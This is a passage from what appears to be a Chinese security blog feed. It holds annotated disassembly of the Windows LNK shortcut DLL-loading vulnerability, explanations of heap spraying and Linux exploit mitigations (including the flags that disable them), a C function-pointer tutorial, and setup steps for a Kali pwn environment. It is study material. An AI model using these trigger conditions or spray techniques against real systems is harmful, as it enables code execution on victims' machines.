class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">7D716064    53              push    ebx</span><br><span class="line">7D716065    FF75 10         push    dword ptr [ebp+10]</span><br><span class="line">7D716068    8D5E 0C         lea     ebx, dword ptr [esi+C]</span><br><span class="line">7D71606B    53              push    ebx</span><br><span class="line">7D71606C    FF75 0C         push    dword ptr [ebp+C]      ;C:\dll.dll,0,&lt;-这个0就是从偏移7A那里得到的iconindex</span><br><span class="line">7D71606F    FF15 0015597D   call    dword ptr [&lt;&amp;KERNEL32.lstrcpynW&gt;&gt;; kernel32.lstrcpynW</span><br><span class="line">7D716075    6A 2C           push    2C</span><br><span class="line">7D716077    FF75 0C         push    dword ptr [ebp+C]</span><br><span class="line">7D71607A    FF15 F41B597D   call    dword ptr [&lt;&amp;SHLWAPI.StrChrW&gt;]   ; shlwapi.StrChrW</span><br><span class="line">7D716080    85C0            test    eax, eax</span><br><span class="line">7D716082    74 5D           je      short 7D7160E1</span><br><span class="line">7D716084    66:8320 00      and     word ptr [eax], 0</span><br><span class="line">7D716088    83C0 02         add     eax, 2</span><br><span class="line">7D71608B    50              push    eax</span><br><span class="line">7D71608C    FF15 641C597D   call    dword ptr [&lt;&amp;SHLWAPI.StrToIntW&gt;] ; shlwapi.StrToIntW</span><br><span class="line">7D716092    8B7D 14         mov     edi, dword ptr [ebp+14]</span><br><span class="line">7D716095    8907            mov     dword ptr [edi], eax</span><br><span class="line">7D716097    8B45 18         mov     eax, dword ptr [ebp+18]</span><br><span class="line">7D71609A    C700 02000000   mov     dword ptr [eax], 2</span><br><span class="line">7D7160A0    8B0F            mov     ecx, dword ptr [edi]</span><br><span class="line">7D7160A2    33D2            xor     edx, edx</span><br><span class="line">7D7160A4    3BCA            cmp     ecx, edx      ;偏移0x7A必须得是0，才会LoadLibary</span><br><span class="line">7D7160A6    75 33           jnz     short 7D7160DB</span><br><span class="line">7D7160A8    C700 1A000000   mov     dword ptr [eax], 1A</span><br><span class="line">7D7160AE    8D86 14020000   lea     eax, dword ptr [esi+214]</span><br><span class="line">7D7160B4    3910            cmp     dword ptr [eax], edx</span><br><span class="line">7D7160B6    8955 0C         mov     dword ptr [ebp+C], edx</span><br><span class="line">7D7160B9    75 16           jnz     short 7D7160D1</span><br><span class="line">7D7160BB    8D4D 0C         lea     ecx, dword ptr [ebp+C]</span><br><span class="line">7D7160BE    51              push    ecx</span><br><span class="line">7D7160BF    8D8E 18020000   lea     ecx, dword ptr [esi+218]</span><br><span class="line">7D7160C5    51              push    ecx</span><br><span class="line">7D7160C6    50              push    eax</span><br><span class="line">7D7160C7    53              push    ebx</span><br><span class="line">7D7160C8    E8 48C4F2FF     call    7D642515      ;这里调用后面</span><br><span class="line"> </span><br><span class="line">后面</span><br><span class="line">7D63866D    FF15 6415597D   call    dword ptr [&lt;&amp;KERNEL32.GetCurrent&gt;; kernel32.GetCurrentProcessId</span><br><span class="line">7D638673    50              push    eax</span><br><span class="line">7D638674    56              push    esi</span><br><span class="line">7D638675    68 00001000     push    100000                           ; UNICODE &quot;f1df_6.0.2600.5512_x-ww_35d4ce83\&quot;</span><br><span class="line">7D63867A    8985 E4FDFFFF   mov     dword ptr [ebp-21C], eax</span><br><span class="line">7D638680    FF15 6815597D   call    dword ptr [&lt;&amp;KERNEL32.OpenProces&gt;; kernel32.OpenProcess</span><br><span class="line">7D638686    3BC6            cmp     eax, esi</span><br><span class="line">7D638688    8985 E8FDFFFF   mov     dword ptr [ebp-218], eax</span><br><span class="line">7D63868E    0F84 E5000000   je      7D638779</span><br><span class="line">7D638694    8D85 F4FDFFFF   lea     eax, dword ptr [ebp-20C]</span><br><span class="line">7D63869A    50              push    eax</span><br><span class="line">7D63869B    FF15 A41C597D   call    dword ptr [&lt;&amp;SHLWAPI.PathFileExi&gt;; shlwapi.PathFileExistsW</span><br><span class="line">7D6386A1    85C0            test    eax, eax</span><br><span class="line">7D6386A3    C785 BCFDFFFF 2&gt;mov     dword ptr [ebp-244], 20</span><br><span class="line">7D6386AD    74 14           je      short 7D6386C3</span><br><span class="line">7D6386AF    8D85 F4FDFFFF   lea     eax, dword ptr [ebp-20C]</span><br><span class="line">7D6386B5    89B5 C0FDFFFF   mov     dword ptr [ebp-240], esi</span><br><span class="line">7D6386BB    8985 C4FDFFFF   mov     dword ptr [ebp-23C], eax</span><br><span class="line">7D6386C1    EB 1A           jmp     short 7D6386DD</span><br><span class="line">7D6386C3    C785 C0FDFFFF 0&gt;mov     dword ptr [ebp-240], 8</span><br><span class="line">7D6386CD    899D C4FDFFFF   mov     dword ptr [ebp-23C], ebx</span><br><span class="line">7D6386D3    C785 D0FDFFFF 7&gt;mov     dword ptr [ebp-230], 7B</span><br><span class="line">7D6386DD    8D85 BCFDFFFF   lea     eax, dword ptr [ebp-244]</span><br><span class="line">7D6386E3    50              push    eax</span><br><span class="line">7D6386E4    FF15 6C15597D   call    dword ptr [&lt;&amp;KERNEL32.CreateActC&gt;; kernel32.CreateActCtxW</span><br><span class="line">7D6386EA    83F8 FF         cmp     eax, -1</span><br><span class="line">7D6386ED    8985 F0FDFFFF   mov     dword ptr [ebp-210], eax</span><br><span class="line">7D6386F3    75 06           jnz     short 7D6386FB</span><br><span class="line">7D6386F5    89B5 F0FDFFFF   mov     dword ptr [ebp-210], esi</span><br><span class="line">7D6386FB    8B3D 8C15597D   mov     edi, dword ptr [&lt;&amp;KERNEL32.Activ&gt;; kernel32.ActivateActCtx</span><br><span class="line">7D638701    8D85 ECFDFFFF   lea     eax, dword ptr [ebp-214]</span><br><span class="line">7D638707    50              push    eax</span><br><span class="line">7D638708    FFB5 F0FDFFFF   push    dword ptr [ebp-210]</span><br><span class="line">7D63870E    FFD7            call    edi</span><br><span class="line">7D638710    33F6            xor     esi, esi</span><br><span class="line">7D638712    46              inc     esi</span><br><span class="line">7D638713    56              push    esi</span><br><span class="line">7D638714    56              push    esi</span><br><span class="line">7D638715    56              push    esi</span><br><span class="line">7D638716    53              push    ebx</span><br><span class="line">7D638717    FF15 00F0787D   call    dword ptr [7D78F000]             ; apphelp.ApphelpCheckExe</span><br><span class="line">7D63871D    85C0            test    eax, eax</span><br><span class="line">7D63871F    75 08           jnz     short 7D638729</span><br><span class="line">7D638721    2185 E0FDFFFF   and     dword ptr [ebp-220], eax</span><br><span class="line">7D638727    EB 0D           jmp     short 7D638736</span><br><span class="line">7D638729    53              push    ebx             ;加载DLL</span><br><span class="line">7D63872A    FF15 A015597D   call    dword ptr [&lt;&amp;KERNEL32.LoadLibrar&gt;; kernel32.LoadLibraryW</span><br><span class="line">7D638730    8985 E0FDFFFF   mov     dword ptr [ebp-220], eax         ; dll.01C00000</span><br></pre></td></tr></table></figure><blockquote><p>参考：</p><p>​<a href="https://bbs.pediy.com/thread-117232.htm">LNK快捷方式文件漏洞简要分析</a></p><p>​0day2：软件漏洞分析精要</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;漏洞简介&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#漏洞简介&quot;&gt;&lt;/a&gt; 漏洞简介&lt;/h1&gt;
&lt;p&gt;LNK 快捷方式文件漏洞，又叫 CPL Icon 加载漏洞。用户只要浏览一下 LNK 文件所在的目录病毒就</summary>
      
    
    
    
    <category term="0day安全" scheme="https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="漏洞" scheme="https://www.rgzzplus.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>Linux中的保护机制</title>
    <link href="https://www.rgzzplus.com/2022/08/01/Linux%E4%B8%AD%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
    <id>https://www.rgzzplus.com/2022/08/01/Linux%E4%B8%AD%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</id>
    <published>2022-08-01T10:24:46.000Z</published>
    <updated>2022-08-01T15:03:15.289Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><p>在编写漏洞利用代码的时候，需要特别注意目标进程是否开启了NX、PIE等机制，例如存在NX的话就不能直接执行栈上的数据，存在PIE 的话各个系统调用的地址就是随机化的。</p><h1 id="一canary栈保护"><a class="markdownIt-Anchor" href="#一canary栈保护"></a> 一：canary（栈保护）</h1><p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p><p>gcc在4.2版本中添加了-fstack-protector和-fstack-protector-all编译参数以支持栈保护功能，</p><p>因此在编译时可以控制是否开启栈保护以及程度，例如：</p><p>1、gcc -o test test.c // 默认情况下，不开启Canary保护</p><p>2、gcc <strong>-fno-stack-protector</strong> -o test test.c //禁用栈保护</p><p>3、gcc <strong>-fstack-protector</strong> -o test test.c //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</p><p>4、gcc <strong>-fstack-protector-all</strong> -o test test.c //启用堆栈保护，为所有函数插入保护代码</p><h1 id="二nxno-execute"><a class="markdownIt-Anchor" href="#二nxno-execute"></a> 二：NX（no execute）</h1><p>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p><p><img src="/2022/08/01/Linux%E4%B8%AD%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/1515742-20190721232115382-1400699323.png" alt="img"></p><p>gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。 例如：</p><p>1、gcc -o test test.c // 默认情况下，开启NX保护</p><p>2、gcc -z execstack -o test test.c // 禁用NX保护</p><p>3、gcc -z noexecstack -o test test.c // 开启NX保护</p><p>在Windows下，类似的概念为DEP（数据执行保护）</p><h1 id="三pieposition-independent-executables"><a class="markdownIt-Anchor" href="#三pieposition-independent-executables"></a> 三：PIE（position-independent executables）</h1><p><strong>位置独立的可执行区域</strong>。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。内存地址随机化机制（address space layout randomization)，有以下三种情况：</p><p>0 - 表示关闭进程地址空间随机化。</p><p>1 - 表示将mmap的基址，stack和vdso页面随机化。</p><p>2 - 表示在1的基础上增加栈（heap）的随机化。</p><p>liunx下关闭PIE的命令如下：</p><p>sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space</p><p>gcc编译命令：</p><p>1、gcc -o test test.c // 默认情况下，不开启PIE</p><p>2、gcc -fpie -pie -o test test.c // 开启PIE，此时强度为1</p><p>3、gcc -fPIE -pie -o test test.c // 开启PIE，此时为最高强度2</p><p>4、gcc -fpic -o test test.c // 开启PIC，此时强度为1，不会开启PIE</p><p>5、gcc -fPIC -o test test.c // 开启PIC，此时为最高强度2，不会开启PIE</p><h1 id="四relro-read-only-relocation"><a class="markdownIt-Anchor" href="#四relro-read-only-relocation"></a> 四：RELRO（ read only relocation）</h1><p>在Linux系统安全领域，数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域。 所以在安全防护的角度来说尽量减少可写的存储区域对安全会有极大的好处。GCC, GNU linker以及Glibc-dynamic linker一起配合实现了一种叫做relro的技术:。大概实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读.设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。</p><p>gcc编译：</p><p>gcc -o test test.c // 默认情况下，是Partial RELRO</p><p>gcc -z norelro -o test test.c // 关闭，即No RELRO</p><p>gcc -z lazy -o test test.c // 部分开启，即Partial RELRO</p><p>gcc -z now -o test test.c // 全部开启</p><h1 id="五-总结"><a class="markdownIt-Anchor" href="#五-总结"></a> 五 总结</h1><p>各种安全选择的编译参数如下：</p><ul><li>NX：-z execstack / -z noexecstack (关闭 / 开启)</li><li>Canary：-fno-stack-protector /-fstack-protector / -fstack-protector-all (关闭 / 开启 / 全开启)</li><li>PIE：-no-pie / -pie (关闭 / 开启)</li><li>RELRO：-z norelro / -z lazy / -z now (关闭 / 部分开启 / 完全开启)</li></ul><blockquote><p>参考资料：<a href="https://www.cnblogs.com/Spider-spiders/p/8798628.html">https://www.cnblogs.com/Spider-spiders/p/8798628.html</a></p><p>本文转载于：<a href="https://www.cnblogs.com/ncu-flyingfox/p/11223390.html">狐狸在飞</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;p&gt;在编写漏洞利用代码的时候，需要特别注意目标进程是否开启了NX、PIE等机制，例如存在NX的话就不能直接执行栈上的数据，存在PIE 的话各个系统调用的地址就是随机化的。&lt;/p&gt;
&lt;h1 id=&quot;一canary栈保护&quot;&gt;&lt;a class=&quot;markdo</summary>
      
    
    
    
    <category term="转载" scheme="https://www.rgzzplus.com/categories/%E8%BD%AC%E8%BD%BD/"/>
    
    
    <category term="Linux保护机制" scheme="https://www.rgzzplus.com/tags/Linux%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>HeapSpary技术及疑问</title>
    <link href="https://www.rgzzplus.com/2022/07/27/HeapSpary%E6%8A%80%E6%9C%AF%E5%8F%8A%E7%96%91%E9%97%AE/"/>
    <id>https://www.rgzzplus.com/2022/07/27/HeapSpary%E6%8A%80%E6%9C%AF%E5%8F%8A%E7%96%91%E9%97%AE/</id>
    <published>2022-07-27T08:08:48.000Z</published>
    <updated>2022-07-27T08:10:06.731Z</updated>
    
    <content type="html"><![CDATA[<h2 id="为什么heap-spary要用0x0c0c0c0c这个奇怪的数字"><a class="markdownIt-Anchor" href="#为什么heap-spary要用0x0c0c0c0c这个奇怪的数字"></a> 为什么heap spary要用0x0C0C0C0C这个奇怪的数字？</h2><p>在讨论这个问题之前，先向小白介绍一下<strong>什么是 Heap Spary？</strong></p><p>Heap Spary 又叫堆喷射，是在 shellcode 的前面加上大量的slide code(滑板指令)，组成一个注入代码段。然后向系统申请大量内存，并且反复用注入代码段来填充。这样就使得内存被大量的注入代码占据。然后通过结合其他漏洞控制程序流，使得程序执行到堆上，最终将导致shellcode的执行。</p><hr><p><strong>Heap Spary 执行流程：</strong></p><p><em>堆喷射将 shellcode放置在了堆中，在堆中执行代码。</em></p><ol><li><p>使用浏览器程序打开我们的poc样本时，它会执行我们样本文件中的JavaScript代码。</p></li><li><p>控制程序eip，使其指向0x0C0C0C0C地址。</p></li></ol><hr><p>了解到 Heap Spary 后，再来讨论，<strong>为什么一定要用 0x0C0C0C0C 填充滑板指令？</strong></p><p>（1）0x0C0C0C0C会被程序解释成 OR AL,0C 可以作为滑板指令（即<strong>执行此种指令不会对程序的后续行为产生影响</strong>），有人说为什么不使用0x90（也是滑板指令）呢？请看下一条。</p><p>（2）之前说过，我们的shellcode会被放到堆中去执行，也就是所谓的使eip指向0x0C0C0C0C这个地址，而0x0C0C0C0C这个地址从0计算的话，大概在192mb左右，但0x90909090就不言而喻了，需要申请的堆空间那就相当大了。</p><hr><p>又有人会说<strong>为甚麽一定要让我们的eip指向0x0C0C0C0C呢？</strong></p><p>堆喷射成功的前提是，我们填充的过程中恰好覆盖了一个虚函数指针，当该虚函数被调用时，先取得栈中的对象指针，通过对象指针取得虚表指针，然后在虚表内适当偏移处取得函数指针执行，过程如下：</p><p><img src="https://img-blog.csdnimg.cn/20200313193154842.png" alt="img"></p><p>因此根据上述过程，当我们使用“0c0c0c0c”作为slide code进行填充时，我们地址0x0c0c0c0c处也必须为“0c0c0c0c”，而正由于这个地址是自指向的，因此恰好执行“0c0c0c0c”命令直到执行shellcode。若为其他地址，将会导致指针跳转至其他地方，无法确保完成shellcode的执行。<br>  也可以通过缓冲区溢出漏洞将EIP修改为0x0c0c0c0c就能跳转到该位置，然后完成shellcode的执行。</p><blockquote><p>参考：</p><p>​<a href="https://blog.csdn.net/m0_46161993/article/details/104846792">Heap Spary原理</a></p><p>​<a href="https://zhuanlan.zhihu.com/p/50891465">初识堆喷射及事例(暴雷漏洞)分析</a></p><p>​<a href="https://www.zhihu.com/question/36171464">为什么heap spary要用0x0C0C0C0C这个奇怪的数字？</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;为什么heap-spary要用0x0c0c0c0c这个奇怪的数字&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#为什么heap-spary要用0x0c0c0c0c这个奇怪的数字&quot;&gt;&lt;/a&gt; 为什么heap spary要用0x0C0C0C</summary>
      
    
    
    
    <category term="0day安全" scheme="https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="HeapSpary" scheme="https://www.rgzzplus.com/tags/HeapSpary/"/>
    
  </entry>
  
  <entry>
    <title>函数指针</title>
    <link href="https://www.rgzzplus.com/2022/07/27/%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88/"/>
    <id>https://www.rgzzplus.com/2022/07/27/%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88/</id>
    <published>2022-07-27T07:57:50.000Z</published>
    <updated>2022-08-01T10:30:12.616Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="函数指针的定义"><a class="markdownIt-Anchor" href="#函数指针的定义"></a> 函数指针的定义</h1><p>程序中的每个函数都位于内存中的某个位置，所以存在**指向那个位置的指针（函数指针）**是完全可能的。</p><p>函数指针定义形式：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">returnType (*pointerName)(param <span class="built_in">list</span>);</span><br><span class="line"><span class="comment">//例子</span></span><br><span class="line"><span class="type">int</span> (*pf)();</span><br></pre></td></tr></table></figure><p>returnType 为函数返回值类型，pointerNmae 为指针名称，param list 为函数参数列表。参数列表中可以同时给出参数的类型和名称，也可以只给出参数的类型，省略参数的名称，这一点和函数原型非常类似。</p><blockquote><p>注意<code>( )</code>的优先级高于<code>*</code>，第一个括号不能省略，如果写作<code>returnType *pointerName(param list);</code>就成了函数原型，它表明函数的返回值类型为<code>returnType *</code>。</p></blockquote><h1 id="函数指针的用法"><a class="markdownIt-Anchor" href="#函数指针的用法"></a> 函数指针的用法</h1><p>初始化函数指针的方法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> (*pf)(<span class="type">int</span>) = &amp;f;  </span><br></pre></td></tr></table></figure><p>初始化表达式中的&amp;操作符是可选的，因为函数名被使用时总是由编译器把它转换为函数指针。&amp;操作符只是显式地说明了编译器将隐式执行的任务。</p><p>在函数指针被声明并且初始化之后，我们就可以使用三种方式调用函数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> ans;</span><br><span class="line">ans = f(<span class="number">25</span>);</span><br><span class="line">ans = (*pf)(<span class="number">25</span>);</span><br><span class="line">ans = pf(<span class="number">25</span>);</span><br></pre></td></tr></table></figure><p>第1条语句简单地<strong>使用名字调用函数f</strong>， 但它的<strong>执行过程</strong>可能和你想象的不太一样。函数名 f 首先被转换为一个函数指针，该指针指定函数在内存中的位置。然后，函数调用操作符调用该函数，执行开始于这个地址的代码。</p><p>第2条语句<strong>对pf执行间接访问操作</strong>，它把函数指针转换为一个函数名。这个转换并不是真正需要的，因为编译器在执行函数调用操作符之前又会把它转换回去。不过，这条语句的效果和第1条语句是完全一样的。</p><p>第3条语句和前两条语句的效果是一样的。间接访问操作并非必需，因为编译器需要的是一个函数指针。这个例子显示了函数指针通常是如何使用的。</p><blockquote><p>参考：</p><p>​<a href="http://c.biancheng.net/cpp/html/3248.html">C语言函数指针（指向函数的指针）</a></p><p>​C和指针</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;函数指针的定义&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#函数指针的定义&quot;&gt;&lt;/a&gt; 函数指针的定义&lt;/h1&gt;
&lt;p&gt;程序中的每个函数都位于内存中的某个位置，所以存在**指向那个位置的指针（函数指针）**是</summary>
      
    
    
    
    <category term="学习笔记" scheme="https://www.rgzzplus.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="c" scheme="https://www.rgzzplus.com/tags/c/"/>
    
    <category term="函数指针" scheme="https://www.rgzzplus.com/tags/%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88/"/>
    
  </entry>
  
  <entry>
    <title>kali搭建pwn环境</title>
    <link href="https://www.rgzzplus.com/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/"/>
    <id>https://www.rgzzplus.com/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/</id>
    <published>2022-07-27T07:32:48.000Z</published>
    <updated>2022-08-01T11:18:47.431Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="系统环境"><a class="markdownIt-Anchor" href="#系统环境"></a> 系统环境</h1><p>**系统环境：**Linux kali 5.14.0-kali4-amd64 (2021-11-05)</p><h1 id="搭建步骤"><a class="markdownIt-Anchor" href="#搭建步骤"></a> 搭建步骤</h1><h2 id="第一步"><a class="markdownIt-Anchor" href="#第一步"></a> 第一步</h2><p>在主目录下创建一个 tools 目录，用来存放下载下来的文件，命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> tools</span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724105421464.png" alt="image-20220724105421464"></p><h2 id="第二步"><a class="markdownIt-Anchor" href="#第二步"></a> 第二步</h2><p>安装pwntools</p><ol><li>进入tools文件夹里面</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> tools</span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724105554318.png" alt="image-20220724105554318"></p><ol start="2"><li>把 pwntools clone下来</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/Gallopsled/pwntools.git</span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724110621476.png" alt="image-20220724110621476"></p><ol start="3"><li>安装所需环境</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential</span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724111211189.png" alt="image-20220724111211189"></p><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724112043388.png" alt="image-20220724112043388"></p><ol start="4"><li>更新 pip</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install --upgrade pip</span><br></pre></td></tr></table></figure><p>我之前安装过python3 和相关的依赖，所以才会出现 黄字</p><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724112358360.png" alt="image-20220724112358360"></p><ol start="5"><li>使用 pip 安装并更新 pwntools</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install --upgrade pwntools</span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724120351366.png" alt="image-20220724120351366"></p><p>到这里 pwntools 环境已经搭建好了</p><h2 id="搭建gdb调试环境"><a class="markdownIt-Anchor" href="#搭建gdb调试环境"></a> 搭建gdb调试环境</h2><ol><li>安装gdb-multiarch，用作gdb客户端进行调试，是任何架构的通用客户端</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gdb-multiarch</span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724120607625.png" alt="image-20220724120607625"></p><p>检查安装是否成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -v</span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724120626220.png" alt="image-20220724120626220"></p><ol start="2"><li>安装插件</li></ol><p>pwndbg是一个方便 gdb 使用的插件</p><p>先将pwndbg git 下来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg.git</span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724121020311.png" alt="image-20220724121020311"></p><p>然后进入到文件夹中，执行 <a href="http://setup.sh">setup.sh</a> 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/tools/pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724121220606.png" alt="image-20220724121220606"></p><p>检查插件是否挂载成功，在终端输入gdb，结果如下：</p><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724134953067.png" alt="image-20220724134953067"></p><p>其它插件peda，def安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/longld/peda.git</span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724135333030.png" alt="image-20220724135333030"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/hugsy/gef.git  </span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/kali%E6%90%AD%E5%BB%BApwn%E7%8E%AF%E5%A2%83/image-20220724135910787.png" alt="image-20220724135910787"></p><p>安装插件依赖</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install keystone-engine ropper 